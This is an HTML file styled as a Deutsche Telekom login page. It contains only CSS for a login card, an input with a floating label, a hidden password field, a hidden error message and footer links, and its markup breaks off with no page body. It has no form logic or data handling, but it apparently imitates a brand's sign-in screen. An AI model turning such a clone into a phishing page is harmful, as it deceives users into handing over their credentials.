<!DOCTYPE html>
<html lang="de">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Telekom Login</title>

    <style>
        :root {
            --pink: #e20074;
            --border: #cfcfcf;
            --text: #111;
            --muted: #6b6b6b;
        }

        * {
            box-sizing: border-box;
            font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif
        }

        body {
            margin: 0;
            min-height: 100vh;
            background:
                linear-gradient(135deg, #7a5b6b 0%, #8e7c86 40%, #7a8a8f 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--text);
        }

        /* pink corner block */
        .corner {
            position: fixed;
            top: 0;
            left: 0;
            width: 70px;
            height: 70px;
            background: var(--pink);
            display: flex;
    align-items: center;
    justify-content: center;
        }
        .corner svg {
            width: 27px;
            height: 44px;
        }

        /* card */
        .card {
            background: #fff;
            width: 528px;
            border-radius: 14px;
            padding: 32px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, .15);
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: end;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 27px;
            font-weight: 600;
            /* margin: 0; */
            display: block;
            font-weight: 800;
        }

        .help {
            width: 26px;
            height: 26px;
            border: 1px solid #000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            cursor: pointer;
        }

      
#label-input {
  transition: all 0.1s ease-in-out;
  color: hsl(0deg 0% 0% / 65%);
  position: absolute;
  top: 30%;
  left: 11px;
  transform: scale(0.95);
  opacity: 1;
  font: 500 14px/1 TeleNeoWeb, sans-serif;
  pointer-events: none;
}

/* .input-base {
  
} */

#input:focus ~ label#label-input,
#input:not(:placeholder-shown) ~ #label-input {
  top: 5% !important;
  left: 5px !important;
  transform: scale(0.8);
  background: white;
  color: hsl(0deg 0% 0% / 65%);
  /* padding: 0 6px; */
  opacity: 1;
}

#input {
  transition: outline 0.2s ease;
  font-size: 14px;
  outline-color: var(--button-text);
  outline: unset;
  border: 1px solid #bbbbbb;
  padding: 15px 10px 10px 13px;
  width: 100%;
  border-radius: 10px;
}

#input:focus {
  box-shadow: 0 0 0 1px #e8e8e8, 0 0 0 3px rgb(92, 127, 202);
}

.relative {
  position: relative;
  margin-bottom: 1rem;
}

        .qmark {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 22px;
            height: 22px;
            border: 1px solid #000;
            border-radius: 50%;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* toggle */
        .toggle {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 12px 0 20px;
        }

        .switch {
            width: 42px;
            height: 22px;
            background: var(--pink);
            border-radius: 20px;
            position: relative;
            cursor: pointer;
        }

        .knob {
            position: absolute;
            top: 2px;
            left: 22px;
            width: 18px;
            height: 18px;
            background: #fff;
            border-radius: 50%;
        }

        .toggle span {
            font-size: 14px;
        }
        .toggle .qmark {
            position: relative !important;
            transform: translateY(0%) !important;
            right: 0;
            width: 22px;
            height: 22px;
            border: 1px solid #000;
            border-radius: 50%;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        /* buttons */
        .btn-primary {
            width: 100%;
            height: 48px;
            background: var(--pink);
            color: #fff;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
        }

        .btn-secondary {
            width: 100%;
            height: 48px;
            background: #fff;
            border: 1px solid var(--border);
            border-radius: 10px;
            font-size: 15px;
            cursor: pointer;
        }

        .register {
            text-align: center;
            margin-top: 18px;
            font-size: 14px;
        }

        .register a {
            color: #2238df;
            font-weight: 500;
            text-decoration: none;
            cursor: pointer;
        }

        /* footer */
        .footer {
            color: #fff;
        }
         footer {
             position: fixed;
            bottom: 16px;
            left: 20px;
            font-size: 13px;
            width: 100%;
            display: flex;
            align-items: baseline;
            justify-content: space-between;
         }
        /* .footer-right {
            position: fixed;
            bottom: 16px;
            right: 20px;
            font-size: 13px;
        } */

        .footer-right a {
            color: #fff;
            /* margin-left: 18px; */
            text-decoration: none;
        }
        .rror {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: -2%;
            font-size: 13px;
        }
        #error {
            display: none;
        }
        .rror svg, .rror span {
            color: red;
        }
        #pass {
            display: none;
        }
        /* mobile */
        @media(max-width:768px) {
            .footer-right a {
            color: #fff;
            /* margin-left: 18px; */
            display: block;
            margin-bottom: 1rem;
            text-decoration: none;
        }
        .footer-right {
            margin-top: 1rem;
        }
            footer {
                position: fixed;
                bottom: 16px;
                left: 20px;
                font-size: 13px;
                color: #fff;
                flex-direction: column;
            }
            .card {
                width: 100%;
                margin-top: 4rem;
                box-shadow: none;
                padding: 30px 17px;
            }
            body {
                background: #fff;
                align-items: start;
            }
            .footer, .footer-right a  {
                color: #000;
            }
            
        }
    </style>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>

    </div>

</html>
